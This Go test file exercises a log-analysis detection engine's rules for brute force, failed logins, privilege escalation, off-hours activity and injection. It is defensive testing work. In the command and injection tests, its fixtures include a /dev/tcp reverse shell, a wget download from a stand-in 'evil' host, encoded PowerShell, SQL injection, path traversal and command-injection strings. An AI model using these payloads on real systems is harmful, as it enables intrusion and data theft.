package detection

import (
	"drishti-nexus/internal/models"
	"drishti-nexus/internal/storage"
	"fmt"
	"testing"
	"time"
)

var t0 = time.Date(2025, 3, 10, 12, 0, 0, 0, time.UTC) // 12:00 UTC: inside normal hours

func newTestEngine(cfg *models.Config) (*Engine, *storage.MemoryStorage) {
	if cfg == nil {
		cfg = &models.Config{NormalHours: models.NormalHours{Start: 9, End: 17}}
	}
	store := storage.NewMemoryStorage(100000)
	return NewEngine(store, cfg), store
}

var seq int

// authEntry builds an sshd-style entry with parser-extracted auth fields.
func authEntry(at time.Time, host, ip, result, event string, pid int) *models.LogEntry {
	seq++
	f := map[string]interface{}{
		"auth_result": result,
		"auth_event":  event,
		"auth_count":  1,
		"pid":         fmt.Sprint(pid),
		"program":     "sshd",
	}
	if ip != "" {
		f["src_ip"] = ip
	}
	return &models.LogEntry{
		ID: fmt.Sprintf("t:%d", seq), Timestamp: at, Source: host,
		Message: event, Severity: models.SeverityInfo, Fields: f,
	}
}

func fail(at time.Time, ip string, pid int) *models.LogEntry {
	return authEntry(at, "srv", ip, "failure", "password_failed", pid)
}

func ok(at time.Time, ip string, pid int) *models.LogEntry {
	return authEntry(at, "srv", ip, "success", "accepted", pid)
}

func textEntry(at time.Time, host, msg string, sev models.Severity) *models.LogEntry {
	seq++
	return &models.LogEntry{ID: fmt.Sprintf("t:%d", seq), Timestamp: at, Source: host, Message: msg, Severity: sev, Fields: map[string]interface{}{}}
}

func run(e *Engine, entries ...*models.LogEntry) []*models.Alert {
	var out []*models.Alert
	for _, en := range entries {
		out = append(out, e.AnalyzeLog(en)...)
	}
	return out
}

func countRule(alerts []*models.Alert, rule string) int {
	n := 0
	for _, a := range alerts {
		if a.RuleName == rule {
			n++
		}
	}
	return n
}

// ── Authentication Brute Force: ≥3 failures then success within 5m, same host+IP ──

func TestBruteForce_Boundaries(t *testing.T) {
	ip := "203.0.113.9"
	tests := []struct {
		name     string
		failures []time.Duration // offsets before the success
		want     int
	}{
		{"3 failures then success → alert", []time.Duration{3 * time.Minute, 2 * time.Minute, time.Minute}, 1},
		{"2 failures then success → no alert (just under threshold)", []time.Duration{2 * time.Minute, time.Minute}, 0},
		{"oldest failure exactly 5m before success counts (inclusive)", []time.Duration{5 * time.Minute, time.Minute, 30 * time.Second}, 1},
		{"oldest failure 5m01s before success does not count", []time.Duration{5*time.Minute + time.Second, time.Minute, 30 * time.Second}, 0},
		{"failures at the same second as the success count", []time.Duration{0, 0, 0}, 1},
	}
	for i, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e, _ := newTestEngine(nil)
			success := t0.Add(10 * time.Minute)
			var entries []*models.LogEntry
			for j, off := range tt.failures {
				entries = append(entries, fail(success.Add(-off), ip, 1000+i*10+j))
			}
			entries = append(entries, ok(success, ip, 2000+i))
			if got := countRule(run(e, entries...), RuleBruteForce); got != tt.want {
				t.Errorf("brute force alerts = %d, want %d", got, tt.want)
			}
		})
	}
}

func TestBruteForce_DifferentSourceIPsDoNotCombine(t *testing.T) {
	e, _ := newTestEngine(nil)
	alerts := run(e,
		fail(t0, "10.0.0.1", 1), fail(t0.Add(time.Second), "10.0.0.2", 2), fail(t0.Add(2*time.Second), "10.0.0.3", 3),
		ok(t0.Add(3*time.Second), "10.0.0.4", 4),
	)
	if countRule(alerts, RuleBruteForce) != 0 {
		t.Error("failures from three different IPs must not make a brute force on a fourth")
	}
}

func TestBruteForce_FailuresAfterSuccessIgnored(t *testing.T) {
	e, _ := newTestEngine(nil)
	// Out-of-order input: success logged before the failures.
	alerts := run(e,
		ok(t0, "10.0.0.1", 1),
		fail(t0.Add(time.Second), "10.0.0.1", 2), fail(t0.Add(2*time.Second), "10.0.0.1", 3), fail(t0.Add(3*time.Second), "10.0.0.1", 4),
	)
	if countRule(alerts, RuleBruteForce) != 0 {
		t.Error("failures after the success are not a brute-force-then-success pattern")
	}
}

// ── Excessive Authentication Failures: ≥5 failures within 10m, same host+IP ──

func TestExcessiveFailures_Boundaries(t *testing.T) {
	tests := []struct {
		name    string
		offsets []time.Duration
		want    int
	}{
		{"5 failures in 4 minutes → alert", []time.Duration{0, time.Minute, 2 * time.Minute, 3 * time.Minute, 4 * time.Minute}, 1},
		{"4 failures → no alert (just under threshold)", []time.Duration{0, time.Minute, 2 * time.Minute, 3 * time.Minute}, 0},
		{"2 failures in 6 minutes → no alert (plan example)", []time.Duration{0, 6 * time.Minute}, 0},
		{"5 failures spanning exactly 10m → alert (inclusive)", []time.Duration{0, 2 * time.Minute, 5 * time.Minute, 8 * time.Minute, 10 * time.Minute}, 1},
		{"5 failures spanning 10m01s → no alert", []time.Duration{0, 2 * time.Minute, 5 * time.Minute, 8 * time.Minute, 10*time.Minute + time.Second}, 0},
	}
	for i, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e, _ := newTestEngine(nil)
			var entries []*models.LogEntry
			for j, off := range tt.offsets {
				entries = append(entries, fail(t0.Add(off), "198.51.100.7", 100+i*10+j))
			}
			if got := countRule(run(e, entries...), RuleExcessiveFailures); got != tt.want {
				t.Errorf("alerts = %d, want %d", got, tt.want)
			}
		})
	}
}

func TestExcessiveFailures_AggregatesBurstIntoOneAlert(t *testing.T) {
	e, store := newTestEngine(nil)
	var entries []*models.LogEntry
	for i := 0; i < 60; i++ {
		entries = append(entries, fail(t0.Add(time.Duration(i)*10*time.Second), "198.51.100.7", 500+i))
	}
	created := run(e, entries...)
	if countRule(created, RuleExcessiveFailures) != 1 {
		t.Fatalf("a continuous burst must raise one alert, got %d", countRule(created, RuleExcessiveFailures))
	}
	a := store.GetAlerts()[0]
	if a.Count != 60 {
		t.Errorf("aggregated count = %d, want 60 (5 at threshold + 55 repeats)", a.Count)
	}
	if !a.Timestamp.Equal(t0) || !a.LastSeen.Equal(t0.Add(590*time.Second)) {
		t.Errorf("Timestamp=%v (want first failure %v) LastSeen=%v", a.Timestamp, t0, a.LastSeen)
	}
	if a.RelatedLogs[0] != entries[0].ID || a.RelatedLogs[4] != entries[4].ID {
		t.Errorf("alert must cite the failures that crossed the threshold: %v", a.RelatedLogs[:5])
	}
	if len(a.RelatedLogs) != maxRelatedLogs || a.Details["related_logs_truncated"] != true {
		t.Errorf("related logs should be capped at %d: %d", maxRelatedLogs, len(a.RelatedLogs))
	}
}

func TestExcessiveFailures_NewBurstAfterQuietWindowIsNewAlert(t *testing.T) {
	e, _ := newTestEngine(nil)
	var entries []*models.LogEntry
	for i := 0; i < 5; i++ {
		entries = append(entries, fail(t0.Add(time.Duration(i)*time.Second), "198.51.100.7", 10+i))
	}
	later := t0.Add(2 * time.Hour)
	for i := 0; i < 5; i++ {
		entries = append(entries, fail(later.Add(time.Duration(i)*time.Second), "198.51.100.7", 20+i))
	}
	alerts := run(e, entries...)
	if got := countRule(alerts, RuleExcessiveFailures); got != 2 {
		t.Fatalf("two bursts 2h apart → %d alerts, want 2", got)
	}
	if alerts[0].IncidentID == alerts[1].IncidentID {
		t.Error("bursts 2h apart (gap > 30m) must be separate incidents")
	}
}

// ── Attempt de-duplication: one login attempt writes several lines ──

func TestAttemptDedup(t *testing.T) {
	ip := "198.51.100.7"
	t.Run("pam + Failed password + Invalid user from one PID count once", func(t *testing.T) {
		e, _ := newTestEngine(nil)
		var entries []*models.LogEntry
		for i := 0; i < 4; i++ {
			at := t0.Add(time.Duration(i) * time.Minute)
			pid := 900 + i
			entries = append(entries,
				authEntry(at, "srv", ip, "failure", "invalid_user", pid),
				authEntry(at, "srv", ip, "failure", "pam_failure", pid),
				authEntry(at.Add(2*time.Second), "srv", ip, "failure", "password_failed", pid),
			)
		}
		if got := countRule(run(e, entries...), RuleExcessiveFailures); got != 0 {
			t.Errorf("4 attempts (12 lines) must stay under the threshold of 5, got %d alerts", got)
		}
	})
	t.Run("repeated Failed password from one PID are separate attempts", func(t *testing.T) {
		e, _ := newTestEngine(nil)
		var entries []*models.LogEntry
		for i := 0; i < 5; i++ {
			entries = append(entries, authEntry(t0.Add(time.Duration(i)*time.Second), "srv", ip, "failure", "password_failed", 42))
		}
		if got := countRule(run(e, entries...), RuleExcessiveFailures); got != 1 {
			t.Errorf("5 attempts on one connection → %d alerts, want 1", got)
		}
	})
	t.Run("message repeated N times carries weight N", func(t *testing.T) {
		e, _ := newTestEngine(nil)
		en := authEntry(t0, "srv", ip, "failure", "password_failed", 7)
		en.Fields["auth_count"] = 5
		if got := countRule(run(e, en), RuleExcessiveFailures); got != 1 {
			t.Errorf("'message repeated 5 times' → %d alerts, want 1", got)
		}
	})
	t.Run("summary lines are not attempts", func(t *testing.T) {
		e, _ := newTestEngine(nil)
		var entries []*models.LogEntry
		for i := 0; i < 10; i++ {
			entries = append(entries, authEntry(t0.Add(time.Duration(i)*time.Second), "srv", ip, "info", "auth_summary", 100+i))
		}
		if len(run(e, entries...)) != 0 {
			t.Error("auth_result=info must never count as a failure")
		}
	})
}

// ── 1.3 Deduplication & correlation ──

func TestBruteForceLinksExcessiveFailures(t *testing.T) {
	e, store := newTestEngine(nil)
	ip := "192.0.2.50"
	var entries []*models.LogEntry
	for i := 0; i < 6; i++ {
		entries = append(entries, fail(t0.Add(time.Duration(i)*10*time.Second), ip, 300+i))
	}
	entries = append(entries, ok(t0.Add(70*time.Second), ip, 400))
	run(e, entries...)

	alerts := store.GetAlerts()
	if len(alerts) != 2 {
		t.Fatalf("want 2 alerts (EF + BF), got %d", len(alerts))
	}
	ef, bf := alerts[0], alerts[1]
	if ef.RuleName != RuleExcessiveFailures || bf.RuleName != RuleBruteForce {
		t.Fatalf("unexpected rules: %s, %s", ef.RuleName, bf.RuleName)
	}
	if ef.IncidentID == "" || ef.IncidentID != bf.IncidentID {
		t.Errorf("same activity must share an incident: %q vs %q", ef.IncidentID, bf.IncidentID)
	}
	if len(bf.RelatedAlerts) != 1 || bf.RelatedAlerts[0] != ef.ID || len(ef.RelatedAlerts) != 1 || ef.RelatedAlerts[0] != bf.ID {
		t.Errorf("alerts not cross-linked: bf=%v ef=%v", bf.RelatedAlerts, ef.RelatedAlerts)
	}
	if ef.Details["superseded_by"] != bf.ID {
		t.Errorf("EF should be marked superseded by BF: %v", ef.Details)
	}
}

func TestIncidentGrouping(t *testing.T) {
	e, _ := newTestEngine(nil)
	a := run(e,
		textEntry(t0, "web01", "GET /x?id=1 UNION SELECT password FROM users", models.SeverityInfo),
		textEntry(t0.Add(20*time.Minute), "web01", "sh -c 'id'", models.SeverityInfo),
		textEntry(t0.Add(25*time.Minute), "db01", "sh -c 'id'", models.SeverityInfo),
		textEntry(t0.Add(3*time.Hour), "web01", "GET /x?id=1 UNION SELECT 1", models.SeverityInfo),
	)
	if len(a) != 4 {
		t.Fatalf("want 4 alerts, got %d", len(a))
	}
	if a[0].IncidentID != a[1].IncidentID {
		t.Error("same host within 30m should share an incident")
	}
	if a[2].IncidentID == a[0].IncidentID {
		t.Error("different hosts must not share an incident")
	}
	if a[3].IncidentID == a[0].IncidentID {
		t.Error("same host 3h later (gap > 30m) must be a new incident")
	}
}

func TestDeterministicIDs(t *testing.T) {
	build := func() []string {
		e, store := newTestEngine(nil)
		for i := 0; i < 6; i++ {
			e.AnalyzeLog(fail(t0.Add(time.Duration(i)*time.Second), "10.9.9.9", 10+i))
		}
		e.AnalyzeLog(textEntry(t0.Add(time.Minute), "h", "powershell -enc AAAA", models.SeverityInfo))
		var ids []string
		for _, a := range store.GetAlerts() {
			ids = append(ids, a.ID+"/"+a.IncidentID)
		}
		return ids
	}
	a, b := build(), build()
	if fmt.Sprint(a) != fmt.Sprint(b) || len(a) == 0 || a[0] != "ALERT-000001/INC-00001" {
		t.Errorf("IDs must be deterministic: %v vs %v", a, b)
	}
}

// ── Content rules ──

func TestPrivilegeEscalation(t *testing.T) {
	tests := []struct {
		msg     string
		program string
		alert   bool
	}{
		{"alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update", "sudo", false},
		{"pam_unix(sudo:auth): authentication failure; logname=bob uid=1000", "sudo", true},
		{"bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/sh", "sudo", true},
		{"alice : 3 incorrect password attempts ; TTY=pts/0", "sudo", true},
		{"FAILED su for root by mallory", "su", true},
		{"Failed password for root from 1.2.3.4 port 22 ssh2", "sshd", false}, // brute force, not escalation
		{"Successful su for root by alice", "su", false},
		{"$UAContext failed to load", "powershell", false}, // 'uac' substring is not UAC
	}
	for _, tt := range tests {
		e, _ := newTestEngine(nil)
		en := textEntry(t0, "h", tt.msg, models.SeverityInfo)
		en.Fields["program"] = tt.program
		if got := countRule(run(e, en), RulePrivilegeEsc) == 1; got != tt.alert {
			t.Errorf("%q: alert=%v, want %v", tt.msg, got, tt.alert)
		}
	}
}

func TestSuspiciousCommandAndInjection(t *testing.T) {
	tests := []struct {
		msg  string
		rule string
	}{
		{"powershell.exe -enc SQBFAFgA", RuleSuspiciousCommand},
		{"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", RuleSuspiciousCommand},
		{"wget http://evil.example/x.sh -O /tmp/x", RuleSuspiciousCommand},
		{"GET /item?id=1 UNION SELECT username,password FROM users", RuleInjection},
		{"GET /search?q=x'; DROP TABLE users;--", RuleInjection},
		{"GET /../../etc/passwd", RuleInjection},
		{"GET /ping?host=1.1.1.1; whoami", RuleInjection},
		{"GET /x?cmd=`id`", RuleInjection},
	}
	for _, tt := range tests {
		e, _ := newTestEngine(nil)
		if countRule(run(e, textEntry(t0, "h", tt.msg, models.SeverityInfo)), tt.rule) != 1 {
			t.Errorf("%q should trigger %s", tt.msg, tt.rule)
		}
	}

	benign := []string{
		"process `syslogd' is using obsolete setsockopt SO_BSDCOMPAT", // lone backtick
		"Started Session 42 of user root.",
		"session opened for user bob by (uid=0) shell=/bin/bash",
		"curling competition results",
		"Failed password for invalid user concat from 180.66.11.80 port 44341 ssh2", // 'ncat ' inside a username (LogHub SSH)
	}
	for _, msg := range benign {
		e, _ := newTestEngine(nil)
		if a := run(e, textEntry(t0, "h", msg, models.SeverityInfo)); len(a) != 0 {
			t.Errorf("benign %q raised %s", msg, a[0].RuleName)
		}
	}
}

// ── Time-based anomaly ──

func TestTimeAnomaly_Boundaries(t *testing.T) {
	day := time.Date(2025, 3, 10, 0, 0, 0, 0, time.UTC)
	tests := []struct {
		at    time.Time
		alert bool
	}{
		{day.Add(8*time.Hour + 59*time.Minute), true}, // 08:59 before start
		{day.Add(9 * time.Hour), false},               // 09:00 start is inside
		{day.Add(16*time.Hour + 59*time.Minute), false},
		{day.Add(17 * time.Hour), true}, // 17:00 end is outside
	}
	for _, tt := range tests {
		e, _ := newTestEngine(nil)
		got := countRule(run(e, ok(tt.at, "10.0.0.1", 1)), RuleTimeAnomaly) == 1
		if got != tt.alert {
			t.Errorf("login at %s: alert=%v, want %v", tt.at.Format("15:04"), got, tt.alert)
		}
	}
}

func TestTimeAnomaly_OnlyAuthOrErrors(t *testing.T) {
	e, _ := newTestEngine(nil)
	night := time.Date(2025, 3, 10, 2, 0, 0, 0, time.UTC)
	if len(run(e, textEntry(night, "h", "cron job ran", models.SeverityInfo))) != 0 {
		t.Error("routine info at night must not alert")
	}
	if countRule(run(e, textEntry(night.Add(time.Minute), "h", "disk error", models.SeverityError)), RuleTimeAnomaly) != 1 {
		t.Error("error at night should alert")
	}
}

func TestTimeAnomaly_AggregatesPerHostPerHour(t *testing.T) {
	e, store := newTestEngine(nil)
	night := time.Date(2025, 3, 10, 2, 0, 0, 0, time.UTC)
	for i := 0; i < 20; i++ {
		e.AnalyzeLog(ok(night.Add(time.Duration(i)*time.Minute), fmt.Sprintf("10.0.0.%d", i), 100+i))
	}
	if n := countRule(store.GetAlerts(), RuleTimeAnomaly); n != 1 {
		t.Errorf("20 night logins on one host within 1h → %d alerts, want 1", n)
	}
}

func TestTimeAnomaly_HonoursTimezone(t *testing.T) {
	cfg := &models.Config{NormalHours: models.NormalHours{Start: 9, End: 17, Timezone: "Asia/Kolkata"}}
	e, _ := newTestEngine(cfg)
	// 04:00 UTC = 09:30 IST → inside hours.
	if len(run(e, ok(time.Date(2025, 3, 10, 4, 0, 0, 0, time.UTC), "10.0.0.1", 1))) != 0 {
		t.Error("09:30 IST is inside normal hours")
	}
}

func TestTimeAnomaly_DisabledWhenHoursUnset(t *testing.T) {
	e, _ := newTestEngine(&models.Config{})
	if len(run(e, ok(time.Date(2025, 3, 10, 2, 0, 0, 0, time.UTC), "10.0.0.1", 1))) != 0 {
		t.Error("no normal hours configured → no time anomalies")
	}
}

// ── Configuration ──

func TestConfigOverridesAndWarnings(t *testing.T) {
	cfg := &models.Config{
		NormalHours: models.NormalHours{Start: 9, End: 17},
		Rules: []models.DetectionRule{
			{Name: RuleExcessiveFailures, Enabled: true, Threshold: 3, TimeWindow: "1m"},
			{Name: RuleSuspiciousCommand, Enabled: false},
			{Name: "Privilege Escalation"}, // stale name from the Phase 0 config
		},
	}
	e, _ := newTestEngine(cfg)

	s := e.setting(RuleExcessiveFailures)
	if s.Threshold != 3 || s.Window != time.Minute {
		t.Errorf("override not applied: %+v", s)
	}
	if len(e.Warnings()) != 1 {
		t.Errorf("unknown rule name should warn once: %v", e.Warnings())
	}
	if len(run(e, textEntry(t0, "h", "powershell -enc AAAA", models.SeverityInfo))) != 0 {
		t.Error("disabled rule fired")
	}
	alerts := run(e, fail(t0, "1.1.1.1", 1), fail(t0.Add(time.Second), "1.1.1.1", 2), fail(t0.Add(2*time.Second), "1.1.1.1", 3))
	if countRule(alerts, RuleExcessiveFailures) != 1 {
		t.Error("threshold 3 not honoured")
	}
}

func TestKeywordFallbackOnlyWithoutStructuredAuth(t *testing.T) {
	e, _ := newTestEngine(nil)
	var entries []*models.LogEntry
	for i := 0; i < 6; i++ {
		en := textEntry(t0.Add(time.Duration(i)*time.Second), "ws1", "Failed to find user profile in script block", models.SeverityInfo)
		en.Fields["auth_result"] = "none" // structured, non-auth (e.g. Windows 4103)
		entries = append(entries, en)
	}
	if countRule(run(e, entries...), RuleExcessiveFailures) != 0 {
		t.Error("auth_result=none must suppress keyword matching")
	}

	e2, _ := newTestEngine(nil)
	var plain []*models.LogEntry
	for i := 0; i < 5; i++ {
		plain = append(plain, textEntry(t0.Add(time.Duration(i)*time.Second), "app", "login failed for user bob", models.SeverityInfo))
	}
	if countRule(run(e2, plain...), RuleExcessiveFailures) != 1 {
		t.Error("unstructured formats still use the keyword fallback")
	}
}

// ── Snapshot / restore (crash recovery) ──

func TestSnapshotRestoreContinuesAggregation(t *testing.T) {
	ip := "203.0.113.200"
	e1, store := newTestEngine(nil)
	for i := 0; i < 5; i++ {
		e1.AnalyzeLog(fail(t0.Add(time.Duration(i)*time.Second), ip, 10+i))
	}
	snap, err := e1.Snapshot()
	if err != nil {
		t.Fatal(err)
	}

	// "Restart": a new engine over the same store, restored from the snapshot.
	e2 := NewEngine(store, &models.Config{NormalHours: models.NormalHours{Start: 9, End: 17}})
	if err := e2.Restore(snap); err != nil {
		t.Fatal(err)
	}
	created := run(e2, fail(t0.Add(6*time.Second), ip, 20), ok(t0.Add(7*time.Second), ip, 21))

	if countRule(created, RuleExcessiveFailures) != 0 {
		t.Error("after restore, the open EF alert should aggregate, not duplicate")
	}
	if countRule(created, RuleBruteForce) != 1 {
		t.Error("failures before the restart must still count toward brute force")
	}
	all := store.GetAlerts()
	if all[0].Count != 6 {
		t.Errorf("EF count = %d, want 6", all[0].Count)
	}
	if created[0].ID != "ALERT-000002" || created[0].IncidentID != all[0].IncidentID {
		t.Errorf("sequence/incident not continued: %s %s", created[0].ID, created[0].IncidentID)
	}
}

func TestRestoreRejectsUnknownVersion(t *testing.T) {
	e, _ := newTestEngine(nil)
	if err := e.Restore([]byte(`{"version":99}`)); err == nil {
		t.Error("expected error for unsupported state version")
	}
}

func TestSweepBoundsState(t *testing.T) {
	e, _ := newTestEngine(nil)
	for i := 0; i < sweepEvery*2; i++ {
		e.AnalyzeLog(fail(t0.Add(time.Duration(i)*time.Second), fmt.Sprintf("10.%d.%d.%d", i>>16&255, i>>8&255, i&255), i))
	}
	if n := len(e.state.Failures); n > 1000 {
		t.Errorf("failure tracking not swept: %d keys", n)
	}
}
